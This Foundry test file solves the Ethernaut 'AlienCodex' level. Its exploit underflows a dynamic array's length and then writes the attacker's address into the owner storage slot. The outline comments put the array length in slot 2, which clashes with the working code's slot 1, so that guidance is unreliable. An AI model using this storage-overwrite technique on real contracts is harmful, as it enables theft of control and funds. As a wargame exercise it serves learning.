// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";

/// @dev AlienCodex is compiled with Solidity 0.5.0 — use an interface + deployCode.
interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract AlienCodexTest is Test {
    IAlienCodex public target;

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(deployer);
        target = IAlienCodex(address(vm.deployCode("AlienCodex.sol:AlienCodex")));
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition (Ethernaut):
        //   target.owner() == attacker
        //
        // Storage layout (AlienCodex inherits Ownable first):
        //   slot 0 → _owner
        //   slot 1 → contact
        //   slot 2 → codex.length (+ array data at keccak256(2) + i)
        //
        // Attack outline:
        //   1. target.makeContact()
        //   2. target.retract() on an empty codex → length underflows to 2**256 - 1
        //   3. target.revise(i, bytes32(uint256(uint160(attacker))))
        //      where i makes keccak256(abi.encode(uint256(2))) + i == 0 (mod 2**256)
        //
        // Tip:
        //   uint256 i = uint256(-int256(keccak256(abi.encode(uint256(2)))));
        //   target.revise(i, bytes32(uint256(uint160(attacker))));

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        target.makeContact();
        target.retract(); // underflow length → full storage addressable

        // Ownable._owner and contact are packed in slot 0; codex length is slot 1.
        // Index i such that keccak256(1) + i ≡ 0 (mod 2**256) → overwrites slot 0 (owner)
        uint256 i = type(uint256).max - uint256(keccak256(abi.encode(uint256(1)))) + 1;
        target.revise(i, bytes32(uint256(uint160(attacker))));
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.owner(), attacker, "attacker should own AlienCodex");
    }
}
